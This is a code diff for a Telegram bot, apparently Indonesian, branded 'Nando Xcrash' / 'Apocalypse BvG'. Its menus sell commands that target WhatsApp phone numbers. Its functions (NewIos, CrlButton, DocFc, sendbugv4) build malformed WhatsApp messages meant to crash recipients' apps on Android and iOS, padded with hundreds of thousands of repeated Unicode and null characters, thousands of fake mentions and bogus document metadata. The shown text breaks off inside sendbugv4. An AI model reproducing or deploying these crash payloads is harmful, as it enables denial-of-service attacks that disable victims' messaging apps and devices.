+  await ctx.telegram.sendChatAction(ctx.chat.id, 'typing');
+
+  const isPremium = isPremiumUser(ctx.from.id);
+  const isAdminStatus = isAdmin(ctx.from.id);
+  const isOwnerStatus = isOwner(ctx.from.id);
+
+  const mainMenuMessage = `
+╭═══〘 𝐀𝐏𝐎𝐂𝐀𝐋𝐘𝐏𝐒𝐄 𝐁𝐯𝐆 𝐕1 〙═══⊱
+┃
+┃ 𝗨𝘀𝗲𝗿 𝗜𝗻𝗳𝗼:
+┃ • Name: ${ctx.from.first_name}
+┃ • Premium: ${isPremium ? '✅' : '❌'}
+┃ • Admin: ${isAdminStatus ? '✅' : '❌'}
+┃
+┃ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲:
+┃ • Version: 𝐕2.1
+┃ • Uptime: ${Math.floor(process.uptime())}s
+┃
+╰═════════════════⊱`;
+
+const mainKeyboard = [
+    [{
+      text: "👑 𝐀𝐙𝐑𝐀𝐄𝐋 𝐃𝐄𝐕",
+      callback_data: "developercmd"
+    },
+    {
+      text: "👹 𝐀𝐏𝐎𝐂𝐀𝐋𝐘𝐏𝐒𝐄 𝐁𝐔𝐆𝐒",
+      callback_data: "bugmenu"
+    }],
+    [{
+      text: "🏠 𝐀𝐏𝐎𝐂𝐀𝐋𝐘𝐏𝐒𝐄 𝐂𝐇𝐀𝐍𝐍𝐄𝐋",
+      url: "https://t.me/ApocalypseV1c"
+    }],
+    [{
+      text: "⚠️ 𝐀𝐃𝐌𝐈𝐍 𝐌𝐄𝐍𝐔",
+      callback_data: "adminmenu"
+    },
+    {
+      text: "📥 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐑", 
+      callback_data: "downloadermenu"
+    }]
+  ];
+
+  setTimeout(async () => {
+    await ctx.replyWithPhoto("https://cdn.anomaki.web.id/file/1739523183904.jpeg", {
+      caption: mainMenuMessage,
+      parse_mode: "Markdown",
+      reply_markup: {
+        inline_keyboard: mainKeyboard
+      }
+    });
+  }, 1000);
+});
+//
+
+bot.action('downloadermenu', async (ctx) => {
+    const mainMenuMessage = `
+  ╭═══════[ 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗥 ]═══════⊱
+  ┃
+  ┃ 👑 𝗗𝗘𝗩 @haunteddevv
+  ┃
+  ┣━━━━[ 𝗙𝗘𝗔𝗧𝗨𝗥𝗘𝗦 ]━━━━◧
+  ┃
+  ┃╰─⟨ /tiktokmp3
+  ┃╰─⟨ /tiktokmp4
+  ┃╰─⟨ /soundcloud
+  ┃
+  ┣━━━━[ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ]━━━━◧
+  ┃
+  ┃ • Status : Active ✅
+  ┃ • Version : 2.1
+  ╰═════════════════════════⊱
+        *© 𝐀𝐏𝐎𝐂𝐀𝐋𝐘𝐏𝐒𝐄  𝐗𝐂𝐑𝐀𝐒𝐇*`;
+  
+    const mainKeyboard = [
+      [{ text: "🔙 BACK TO MENU", callback_data: "main_menu" }]
+    ];
+  
+    await ctx.editMessageCaption(mainMenuMessage, {
+      parse_mode: "Markdown",
+      reply_markup: {
+        inline_keyboard: mainKeyboard
+      }
+    });
+  });
+
+// /id command to show chat ID
+bot.command("id", async (ctx) => {
+  await ctx.reply(`Your Chat ID: \`${ctx.chat.id}\`\nYour User ID: \`${ctx.from.id}\``, { parse_mode: "Markdown" });
+});
+
+// Handler untuk callback "owner_management"
+bot.action('developercmd', async (ctx) => {
+  const mainMenuMessage = `
+╔─═「 𝐃𝐄𝐕 𝐌𝐄𝐍𝐔」─═⬣
+│ ┏⊱
+╠ ▢ /addpairing ->>>
+╠ ▢ /addowner ->>>
+╠ ▢ /delowner ->>>
+╠ ▢ /addadmin ->>>
+╠ ▢ /deladmin ->>>
+╠ ▢ /addprem ->>>
+╠ ▢ /delprem ->>>
+│ ┗⊱
+╚─═─═─═─═─═─═─═⬣
+          *𝐍𝐀𝐍𝐃𝐎 𝐗𝐂𝐑𝐀𝐒𝐇*`;
+
+  const mainKeyboard = [
+    [{
+      text: "🔄 𝗥𝗲𝗳𝗿𝗲𝘀𝗵",
+      callback_data: "developercmd"
+    },
+    {
+      text: "🏠 𝗕𝗮𝗰𝗸",
+      callback_data: "main_menu"
+    }]
+  ];
+
+  await ctx.editMessageCaption(mainMenuMessage, {
+    parse_mode: "Markdown",
+    reply_markup: {
+      inline_keyboard: mainKeyboard
+    }
+  });
+});
+
+bot.action('adminmenu', async (ctx) => {
+  // Hapus pesan menu own
+  const isPremium = isPremiumUser(ctx.from.id);
+  const isAdminStatus = isAdmin(ctx.from.id);
+  const isOwnerStatus = isOwner(ctx.from.id);
+  // Kirim ulang menu utama (Anda dapat menggunakan kode yang sama seperti pada bot.start)
+  const mainMenuMessage = `
+
+╔─═「 𝐀𝐃𝐌𝐈𝐍͢𝐌𝐄𝐍𝐔」─═⬣
+│ ┏⊱
+╠ ▢ /addprem ->>>
+╠ ▢ /delprem ->>>
+│ ┗⊱
+╚─═─═─═─═─═─═─═⬣
+© ᴅᴇᴠᴇʟᴏᴘᴇʀ - @haunteddevv 
+`;
+
+  const mainKeyboard = [
+    [{
+      text: "🔚 𝐁𝐚𝐜𝐤𝐓𝐨𝐌𝐞𝐧𝐮",
+      callback_data: "main_menu"
+    }]
+  ];
+
+
+  ctx.replyWithPhoto("https://cdn.anomaki.web.id/file/1739523183904.jpeg", {
+      caption: mainMenuMessage,
+      parse_mode: "Markdown",
+      reply_markup: {
+        inline_keyboard: mainKeyboard
+      }
+    });
+});
+
+bot.action('bugmenu', async (ctx) => {
+  const isPremium = isPremiumUser(ctx.from.id);
+  const mainMenuMessage = `
+╭═══[ 𝐍𝐀𝐍𝐃𝐎 𝐗𝐂𝐑𝐀𝐒𝐇 𝐕2.1 ]─═⬣
+┃
+┃ ⚔️𝐂𝐌𝐃 𝐍𝐀𝐍𝐃𝐎
+┃
+┃└⊜ /ndoforcev1 628xx
+┃└⊜ /ndoforcev2 628xx
+┃└⊜ /ndobetav1 628xx
+┃└⊜ /ndobetav2 628xx
+┃└⊜ /ndoiosv1 628xx
+┃└⊜ /ndoiosv2 628xx
+┃
+┃ 👑 𝗗𝗘𝗩 @haunteddevv
+┃
+┗━━━━[ 𝗕𝗨𝗚 𝗧𝗬𝗣𝗘𝗦 ]━━━━◧
+  
+💨 Instant   📄 Document
+🦠 Combo   🔱 Multi 
+👾 Ultimate.  👹 Special 
+
+           *© 𝐍𝐀𝐍𝐃𝐎 𝐗𝐂𝐑𝐀𝐒𝐇*`;
+
+  const mainKeyboard = [
+    [
+      { text: "👑 𝐍𝐀𝐍𝐃𝐎 𝐀𝐍𝐃𝐑𝐎", callback_data: "android_bugs" },
+      { text: "💀 IOS BUGS", callback_data: "ios_bugs" }
+    ],
+    [
+      { text: "🏠 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐀𝐏𝐎𝐂𝐀𝐋𝐘𝐏𝐒𝐄 𝐁𝐯𝐆 ", url: "https://t.me/ApocalypseV1c" }
+    ],
+    [
+      { text: "🔙 BACK TO MENU", callback_data: "main_menu" }
+    ]
+  ];
+
+  await ctx.replyWithPhoto("https://cdn.anomaki.web.id/file/1739523183904.jpeg", {
+    caption: mainMenuMessage,
+    parse_mode: "Markdown",
+    reply_markup: {
+      inline_keyboard: mainKeyboard
+    }
+  });
+});
+
+// Handler untuk Android Bugs
+bot.action('android_bugs', async (ctx) => {
+  const androidMessage = `
+╭══════[ 𝐍𝐀𝐍𝐃𝐎 𝐀𝐍𝐃𝐑𝐎 ]══════⊱
+┃
+┃ 👑 𝗗𝗘𝗩 @haunteddevv
+┃
+┣━━━━[ 𝗙𝗘𝗔𝗧𝗨𝗥𝗘𝗦 ]━━━━◧
+┃
+┃╰─⟨ /ndoforcev1 628xx
+┃╰─⟨ /ndoforcev2 628xx
+┃╰─⟨ /ndobetav1 628xx
+┃╰─⟨ /ndobetav2 628xx   
+┃
+┣━━━━[ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ]━━━━◧
+┃ • Target : All Android 
+┃ • Success Rate : 100%
+╰═════════════════════════⊱
+           *© 𝐍𝐀𝐍𝐃𝐎 𝐗𝐂𝐑𝐀𝐒𝐇*`;
+
+  await ctx.editMessageCaption(androidMessage, {
+    parse_mode: "Markdown",
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "🔙 BACK TO BUG MENU", callback_data: "bugmenu" }]
+      ]
+    }
+  });
+});
+
+// Handler untuk iOS Bugs
+bot.action('ios_bugs', async (ctx) => {
+  const iosMessage = `
+╭══════[ 𝐍𝐀𝐍𝐃𝐎 𝐈𝐎𝐒 ]══════⊱
+┃
+┃  👑 𝗗𝗘𝗩 @Haunteddevv
+┃
+┣━━━━[ 𝗙𝗘𝗔𝗧𝗨𝗥𝗘𝗦 ]━━━━◧
+┃
+┃╰─⟨ /ndoiosv1 628xx
+┃╰─⟨ /ndoiosv2 628xx
+┃
+┣━━━━[ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ]━━━━◧
+┃ • Target : iOS Only
+┃ • Success Rate : 100%
+╰═════════════════════════⊱
+           *© 𝐍𝐀𝐍𝐃𝐎 𝐗𝐂𝐑𝐀𝐒𝐇*`;
+
+  await ctx.editMessageCaption(iosMessage, {
+    parse_mode: "Markdown",
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "🔙 BACK TO BUG MENU", callback_data: "bugmenu" }]
+      ]
+    }
+  });
+});
+
+bot.action('ownermenu', async (ctx) => {
+  const isPremium = isPremiumUser(ctx.from.id);
+  const isAdminStatus = isAdmin(ctx.from.id);
+  const isOwnerStatus = isOwner(ctx.from.id);
+ 
+  const mainMenuMessage = `
+╔─═「 𝐀𝐃𝐌𝐈𝐍͢𝐌𝐄𝐍𝐔」─═⬣
+│ ┏⊱
+╠ ▢ /addowner ->>>
+╠ ▢ /delowner ->>>
+╠ ▢ /addprem ->>>
+╠ ▢ /delprem ->>>
+│ ┗⊱
+╚─═─═─═─═─═─═─═⬣
+ ┣━━━━[ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ]━━━━◧
+ ┃
+ ┃ ❐ Owner : ${isOwnerStatus ? '𝚈𝙴𝚂 ✅' : '𝙽𝙾 ❌'}  
+ ┃ ❐ Premium : ${isPremium ? '𝙰𝙲𝚃𝙸𝚅𝙴 ✅' : '𝙳𝙴𝙰𝙲𝚃𝙸𝚅𝙴 ❌'}
+ ┃ ❐ Admin : ${isAdminStatus ? '𝚈𝙴𝚂 ✅' : '𝙽𝙾 ❌'}
+ ┃
+ ╰═════════════════════════⊱
+          *𝐍𝐀𝐍𝐃𝐎 𝐗𝐂𝐑𝐀𝐒𝐇*
+      *© Developer - @haunteddevv*`;
+ 
+  const mainKeyboard = [
+    [
+      { text: "👥 LIST ADMIN", callback_data: "listadmin" },
+      { text: "📊 LIST USER", callback_data: "listuser" }
+    ],
+    [
+      { text: "🔙 BACK TO MENU", callback_data: "main_menu" }
+    ]
+  ];
+ 
+  await ctx.replyWithPhoto("https://cdn.anomaki.web.id/file/1739523183904.jpeg", {
+    caption: mainMenuMessage,
+    parse_mode: "Markdown",
+    reply_markup: {
+      inline_keyboard: mainKeyboard
+    }
+  });
+ });
+
+// Handler untuk callback "main_menu"
+bot.action('main_menu', async (ctx) => {
+  await ctx.deleteMessage();
+  const isPremium = isPremiumUser(ctx.from.id);
+  const isAdminStatus = isAdmin(ctx.from.id);
+  const isOwnerStatus = isOwner(ctx.from.id);
+ 
+  const mainMenuMessage = `
+ ╭══[ 𝐍𝐀𝐍𝐃𝐎 𝐗𝐂𝐑𝐀𝐒𝐇 𝐕2.1 ]══⊱
+ ┃ 
+ ┃ 👑 𝗗𝗘𝗩 @haunteddevv
+ ┃
+ ┣━━━━[ 𝗦𝗧𝗔𝗧𝗨𝗦 𝗜𝗡𝗙𝗢 ]━━━━◧
+ ┃
+ ┃ ⬡ Premium : ${isPremium ? '𝙰𝙲𝚃𝙸𝚅𝙴 ✅' : '𝙳𝙴𝙰𝙲𝚃𝙸𝚅𝙴 ❌'}
+ ┃ ⬡ Admin : ${isAdminStatus ? '𝚈𝙴𝚂 ✅' : '𝙽𝙾 ❌'}
+ ┃ ⬡ Owner : ${isOwnerStatus ? '𝚈𝙴𝚂 ✅' : '𝙽𝙾 ❌'}
+ ┃
+ ┣━━━━[ 𝗠𝗘𝗡𝗨 𝐁𝐔𝐆𝐒 ]━━━━◧
+ ┃
+ ┃└⊜ /ndoforcev1 628xx
+ ┃└⊜ /ndoforcev2 628xx
+ ┃└⊜ /ndobetav1 628xx
+ ┃└⊜ /ndobetav2 628xx
+ ┃└⊜ /ndoiosv1 628xx
+ ┃└⊜ /ndoiosv2 628xx
+ ┃
+ ┣━━━━[ 𝗦𝗬𝗦𝗧𝗘𝗠 𝗜𝗡𝗙𝗢 ]━━━━◧
+ ┃ 
+ ┃ ❍ Mode : brutall
+ ┃ ❍ Version : 2.1
+ ┃ 
+ ╰═════════════════════════⊱
+ 
+     *© 𝐍𝐀𝐍𝐃𝐎 𝐗𝐂𝐑𝐀𝐒𝐇*`;
+ 
+        const mainKeyboard = [
+            [{
+              text: "👑 𝐍𝐀𝐍𝐃𝐎 𝐃𝐄𝐕",
+              callback_data: "developercmd"
+            },
+            {
+              text: "👹 𝐍𝐀𝐍𝐃𝐎 𝐁𝐔𝐆𝐒",
+              callback_data: "bugmenu"
+            }],
+            [{
+              text: "🏠 𝐂𝐇 𝐍𝐀𝐍𝐃𝐎 𝐂𝐑𝐀𝐒𝐇",
+              url: "https://t.me/ApocalypseV1c"  
+            }],
+            [{
+              text: "⚠️ 𝐀𝐃𝐌𝐈𝐍 𝐌𝐄𝐍𝐔",
+              callback_data: "adminmenu"
+            },
+            {
+              text: "📥 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐑", 
+              callback_data: "downloadermenu"
+            }]
+          ];
+ 
+  await ctx.replyWithPhoto("https://cdn.anomaki.web.id/file/1739523183904.jpeg", {
+    caption: mainMenuMessage,
+    parse_mode: "Markdown",
+    reply_markup: {
+      inline_keyboard: mainKeyboard
+    }
+  });
+ });
+
+  async function NewIos(target, ptcp = true) {
+  try {
+    await zephy.relayMessage(
+      target,
+      {
+        extendedTextMessage: {
+          text: `𑲭𑲭𝐍𝐀𝐍𝐃𝐎⿻𝐂𝐑𝐀𝐒𝐇𝐄𝐑⿻¿? ${'ꦾ'.repeat(103000)} ${'@0'.repeat(25000)}`,
+          contextInfo: {
+            mentionedJid: [
+              "0@s.whatsapp.net",
+              ...Array.from({ length: 15000 }, () => `${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
+            ],
+            stanzaId: "1234567890ABCDEF",
+            participant: "0@s.whatsapp.net",
+            quotedMessage: {
+              callLogMesssage: {
+                isVideo: true,
+                callOutcome: "1",
+                durationSecs: "0",
+                callType: "REGULAR",
+                participants: [
+                  {
+                    jid: "0@s.whatsapp.net",
+                    callOutcome: "1"
+                  }
+                ]
+              }
+            },
+            remoteJid: "0@s.whatsapp.net",
+            conversionSource: "source_example",
+            conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
+            conversionDelaySeconds: 10,
+            forwardingScore: 99999999,
+            isForwarded: true,
+            quotedAd: {
+              advertiserName: "Apocalypse BvG",
+              mediaType: "IMAGE",
+              jpegThumbnail: tdxlol,
+              caption: "© Azrael INC"
+            },
+            placeholderKey: {
+              remoteJid: "0@s.whatsapp.net",
+              fromMe: false,
+              id: "ABCDEF1234567890"
+            },
+            expiration: 86400,
+            ephemeralSettingTimestamp: "1728090592378",
+            ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
+            externalAdReply: {
+              title: "Apocalypse - CRITICAL FINISH",
+              body: `iOS System Crash ${'\0'.repeat(200)}`,
+              mediaType: "VIDEO",
+              renderLargerThumbnail: true,
+              previewType: "VIDEO",
+              thumbnail: tdxlol,
+              sourceType: "Apocalypse",
+              sourceId: "crasher",
+              sourceUrl: "https://t.me/ApocalypseV1c",
+              mediaUrl: "https://t.me/ApocalypseBvG",
+              containsAutoReply: true,
+              showAdAttribution: true,
+              ctwaClid: "nando_clid",
+              ref: "ref_crasher"
+            },
+            entryPointConversionSource: "_source",
+            entryPointConversionApp: "nando_app",
+            entryPointConversionDelaySeconds: 5,
+            disappearingMode: {},
+            actionLink: {
+              url: "https://t.me/NandoDev01"
+            },
+            groupSubject: "nando Crasher",
+            parentGroupJid: "0@g.us",
+            trustBannerType: "nando_banner",
+            trustBannerAction: 1,
+            isSampled: false,
+            utm: {
+              utmSource: "nando",
+              utmCampaign: "crasher"
+            },
+            forwardedNewsletterMessageInfo: {
+              newsletterJid: "0@newsletter",
+              serverMessageId: 1,
+              newsletterName: "Nando Ai",
+              contentType: "UPDATE",
+              accessibilityText: "Nando Ai"
+            },
+            businessMessageForwardInfo: {
+              businessOwnerJid: "0@s.whatsapp.net"
+            },
+            smbriyuCampaignId: "nando_campaign",
+            smbServerCampaignId: "crasher_campaign",
+            dataSharingContext: {
+              showMmDisclosure: true
+            }
+          }
+        }
+      },
+      ptcp ? { participant: { jid: target, count: 1 } } : {}
+    );
+    console.log(chalk.green.bold(`[✓] Success sent NewIos to ${target}`));
+  } catch (error) {
+    console.error(chalk.red.bold(`[!] Error sending NewIos:`, error));
+    throw error;
+  }
+}
+
+ async function CrlButton(isTarget) {
+  const msg = generateWAMessageFromContent(
+      isTarget,
+      {
+          viewOnceMessage: {
+              message: {
+                  interactiveMessage: {
+                      body: {
+                          text: `\0`
+                      },
+                      carouselMessage: {
+                          cards: [
+                              {
+                                  header: {
+                                      ...(await prepareWAMessageMedia(
+                                          { image: { url: "https://cdn.anomaki.web.id/file/1739523183904.jpeg" } }, 
+                                          { upload: zephy.waUploadToServer }
+                                      )),
+                                      title: `\0`,
+                                      gifPlayback: true,
+                                      subtitle: '\0',
+                                      hasMediaAttachment: true
+                                  },
+                                  body: {
+                                      text: `𝐍𝐚𝐧𝐝𝐨 𝐗𝐜𝐫𝐚𝐬𝐡𝐞𝐫 𝐕2` + "ꦾ".repeat(120000)
+                                  },
+                                  footer: {
+                                      text: "\0"
+                                  },
+                                  nativeFlowMessage: {
+                                      buttons: [
+                                          {
+                                              name: "single_select",
+                                              buttonParamsJson: JSON.stringify({
+                                                  title: "😂۞𝐍𝐚𝐧𝐝𝐨 𝐗𝐜𝐫𝐚𝐬𝐡𝐞𝐫 V2⃟😂",
+                                                  sections: []
+                                              })
+                                          },
+                                          {
+                                              name: "single_select",
+                                              buttonParamsJson: `{"title":"${"𑲭𑲭".repeat(90000)}","sections":[{"title":" Nando Crasher ","rows":[]}]}`
+                                          },
+                                          {
+                                              name: "call_permission_request",
+                                              buttonParamsJson: "{}"
+                                          },
+                                          {
+                                              name: "mpm",
+                                              buttonParamsJson: "{}"
+                                          },
+                                          {
+                                              name: "single_select",
+                                              buttonParamsJson: "{\"title\":\"🦠\",\"sections\":[{\"title\":\"🔥\",\"highlight_label\":\"💥\",\"rows\":[{\"header\":\"\",\"title\":\"💧\",\"id\":\"⚡\"},{\"header\":\"\",\"title\":\"💣\",\"id\":\"✨\"}]}]}"
+                                          },
+                                          {
+                                              name: "quick_reply",
+                                              buttonParamsJson: "{\"display_text\":\"Quick Crash Reply\",\"id\":\"📌\"}"
+                                          },
+                                          {
+                                              name: "cta_url",
+                                              buttonParamsJson: "{\"display_text\":\"Official Group\",\"url\":\"https://t.me/ApocalypseBvG\",\"merchant_url\":\"https://t.me/ApocalypseV1c\"}"
+                                          },
+                                          {
+                                              name: "cta_call",
+                                              buttonParamsJson: "{\"display_text\":\"Call Us Null\",\"id\":\"message\"}"
+                                          },
+                                          {
+                                              name: "cta_copy",
+                                              buttonParamsJson: "{\"display_text\":\"Copy Crash Code\",\"id\":\"message\",\"copy_code\":\"#NANDOV2.0\"}"
+                                          },
+                                          {
+                                              name: "cta_reminder",
+                                              buttonParamsJson: "{\"display_text\":\"Set Reminder Crash\",\"id\":\"message\"}"
+                                          },
+                                          {
+                                              name: "cta_cancel_reminder",
+                                              buttonParamsJson: "{\"display_text\":\"Cancel Reminder Crash\",\"id\":\"message\"}"
+                                          },
+                                          {
+                                              name: "address_message",
+                                              buttonParamsJson: "{\"display_text\":\"Send Crash Address\",\"id\":\"message\"}"
+                                          },
+                                          {
+                                              name: "send_location",
+                                              buttonParamsJson: "\0"
+                                          }
+                                      ]
+                                  }
+                              }
+                          ],
+                          messageVersion: 1,
+                      }
+                  }
+              }
+          }
+      },
+      { quoted: QBug }
+  );
+  try {
+      await zephy.relayMessage(isTarget, msg.message, {
+          messageId: msg.key.id,
+      });
+      console.log(chalk.green.bold("[✓] Success! CrlButton Sent"));
+  } catch (error) {
+      console.error(chalk.red.bold("[!] Error sending CrlButton:"), error);
+      throw error;
+  }
+}
+
+ async function DocFc(isTarget) {
+  const stanza = [
+    {
+      attrs: { biz_bot: '1' },
+      tag: "bot",
+    },
+    {
+      attrs: {},
+      tag: "biz",
+    },
+  ];
+  
+  let messagePayload = {
+    viewOnceMessage: {
+      message: {
+        listResponseMessage: {
+          title: "༿༑ᜳ𝐍𝐚𝐧𝐝𝐨 𝐗𝐜𝐫𝐚𝐬𝐡𝐞𝐫ᢶ⃟" + "ꦾ".repeat(4500),
+          listType: 2,
+          singleSelectReply: {
+            selectedRowId: "🔪"
+          },
+          contextInfo: {
+            stanzaId: zephy.generateMessageTag(),
+            participant: "0@s.whatsapp.net",
+            remoteJid: "status@broadcast",
+            mentionedJid: [isTarget, "13135550002@s.whatsapp.net"],
+            quotedMessage: {
+              buttonsMessage: {
+                documentMessage: {
+                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
+                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
+                  fileLength: "9999999999999",
+                  pageCount: 3567587327,
+                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
+                  fileName: "༿༑ᜳ𝐍𝐚𝐧𝐝𝐨 𝐗𝐜𝐫𝐚𝐬𝐡𝐞𝐫ᢶ⃟",
+                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
+                  directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
+                  mediaKeyTimestamp: "1735456100",
+                  contactVcard: true,
+                  caption: "Apocalypse BvG V1!"
+                },
+                contentText: "Apocalypse V1 \"😮‍💨\"",
+                footerText: "© Azrael Inc",
+                buttons: [
+                  {
+                    buttonId: "\u0000".repeat(850000),
+                    buttonText: {
+                      displayText: "⩟⬦𪲁 𝐍𝐚𝐧𝐝𝐨 𝐗𝐜𝐫𝐚𝐬𝐡𝐞𝐫 -"
+                    },
+                    type: 1
+                  }
+                ],
+                headerType: 3
+              }
+            },
+            conversionSource: "nusantara",
+            conversionData: crypto.randomBytes(16),
+            conversionDelaySeconds: 9999,
+            forwardingScore: 999999,
+            isForwarded: true,
+            quotedAd: {
+              advertiserName: " x ",
+              mediaType: "IMAGE",
+              jpegThumbnail: tdxlol,
+              caption: " x "
+            },
+            placeholderKey: {
+              remoteJid: "0@s.whatsapp.net",
+              fromMe: false,
+              id: "ABCDEF1234567890"
+            },
+            expiration: -99999,
+            ephemeralSettingTimestamp: Date.now(),
+            ephemeralSharedSecret: crypto.randomBytes(16),
+            entryPointConversionSource: "nando",
+            entryPointConversionApp: "nando",
+            actionLink: {
+              url: "t.me/https://t.me/ApocalypseBvG",
+              buttonTitle: "crash"
+            },
+            disappearingMode: {
+              initiator: 1,
+              trigger: 2,
+              initiatorDeviceJid: isTarget,
+              initiatedByMe: true
+            },
+            groupSubject: "crash",
+            parentGroupJid: "combine",
+            trustBannerType: "unexpected",
+            trustBannerAction: 99999,
+            isSampled: true,
+            externalAdReply: {
+              title: "𑲭𑲭 Nando ~ \"crash\" ⚔️ ",
+              mediaType: 2,
+              renderLargerThumbnail: false,
+              showAdAttribution: false,
+              containsAutoReply: false,
+              body: "© Apocalypse Crasher",
+              thumbnail: tdxlol,
+              sourceUrl: "se me?",
+              sourceId: "nando ~ crash",
+              ctwaClid: "cta",
+              ref: "ref",
+              clickToWhatsappCall: true,
+              automatedGreetingMessageShown: false,
+              greetingMessageBody: "burst",
+              ctaPayload: "cta",
+              disableNudge: true,
+              originalImageUrl: "crash"
+            },
+            featureEligibilities: {
+              cannotBeReactedTo: true,
+              cannotBeRanked: true,
+              canRequestFeedback: true
+            },
+            forwardedNewsletterMessageInfo: {
+              newsletterJid: "120363321780343299@newsletter",
+              serverMessageId: 1,
+              newsletterName: `Crash Sletter ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
+              contentType: 3,
+              accessibilityText: "crash"
+            },
+            statusAttributionType: 2,
+            utm: {
+              utmSource: "utm",
+              utmCampaign: "utm2"
+            }
+          },
+          description: "INITIATED_BY_USER"
+        },
+        messageContextInfo: {
+          messageSecret: crypto.randomBytes(32),
+          supportPayload: JSON.stringify({
+            version: 2,
+            is_ai_message: true,
+            should_show_system_message: true,
+            ticket_id: crypto.randomBytes(16),
+          }),
+        },
+      }
+    }
+  };
+
+  try {
+    await zephy.relayMessage(isTarget, messagePayload, {
+      additionalNodes: stanza,
+      participant: { jid: isTarget, count: 1 }
+    });
+    console.log(chalk.green.bold("[✓] Successfully sent DocFc crash to " + isTarget));
+  } catch (error) {
+    console.error(chalk.red.bold("[!] Error sending DocFc crash:"), error);
+    throw error;
+  }
+}
+
+//coba function
+
+async function sendbugv4(target, ptcp = true) {
+  try {
+    const stanza = [
+      {
+        attrs: { biz_bot: "1" },
+        tag: "bot",
+      },
+      {
+        attrs: {},
+        tag: "biz",
+      },
+    ];
+
+    let messagePayload = {
+      viewOnceMessage: {
+        message: {
+          listResponseMessage: {
+            title: "𝐍𝐚𝐧𝐝𝐨 𝐗𝐜𝐫𝐚𝐬𝐡𝐞𝐫👀" + "ꦽ".repeat(9740),
+            listType: 2,
+            singleSelectReply: {
+              selectedRowId: "⚡",
+            },
+            contextInfo: {
+              stanzaId: zephy.generateMessageTag(),
+              participant: "0@s.whatsapp.net",
+              remoteJid: "status@broadcast",
+              mentionedJid: [target],
+              quotedMessage: {
+                buttonsMessage: {
+                  documentMessage: {
+                    url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
+                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                    fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
+                    fileLength: "9999999999999",
+                    pageCount: 3567587327,
+                    mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
+                    fileName: "𝐍𝐚𝐧𝐝𝐨 𝐗𝐜𝐫𝐚𝐬𝐡𝐞𝐫",
+                    fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
+                    directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
+                    mediaKeyTimestamp: "1735456100",
+                    contactVcard: true,
+                    caption: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂 𝚂𝙴𝙽𝙳 𝙱𝚄𝙶 𝚃𝙾 𝚃𝙰𝚁𝙶𝙴𝚃",
+                  },
+                  contentText: '༑ 𝐍𝐚𝐧𝐝𝐨 𝐗𝐜𝐫𝐚𝐬𝐡𝐞𝐫"👋"',
+                  footerText: "© Apocalypse BvG V1",
+                  buttons: [
+                    {
+                      buttonId: "\u0000".repeat(900000),
+                      buttonText: {
+                        displayText: "𝐍𝐚𝐧𝐝𝐨 𝐗𝐜𝐫𝐚𝐬𝐡𝐞𝐫 👀",
+                      },
+                      type: 1,
+                    },
+                  ],
+                  headerType: 3,
+                },
+              },
+              conversionSource: "nando",
+              conversionData: crypto.randomBytes(16),
+              conversionDelaySeconds: 9999,
+              forwardingScore: 999999,
+              isForwarded: true,
+              quotedAd: {
+                advertiserName: "Azrael",
+                mediaType: "IMAGE",
+                jpegThumbnail: tdxlol,
+                caption: "Apocalypse Crasher",
+              },
+              placeholderKey: {
+                remoteJid: "0@s.whatsapp.net",
+                fromMe: false,
+                id: "ABCDEF1234567890",
+              },
+              expiration: -99999,
+              ephemeralSettingTimestamp: Date.now(),
+              ephemeralSharedSecret: crypto.randomBytes(16),
+              entryPointConversionSource: "nando",
+              entryPointConversionApp: "crasher",
+              actionLink: {
+                url: "t.me/ApocalypseBvG",
+                buttonTitle: "Join Group",
+              },
+              disappearingMode: {
+                initiator: 1,
+                trigger: 2,
+                initiatorDeviceJid: target,
+                initiatedByMe: true,
+              },
+              groupSubject: "crasher",
+              parentGroupJid: "nando",
+              trustBannerType: "nando",
+              trustBannerAction: 99999,
+              isSampled: true,
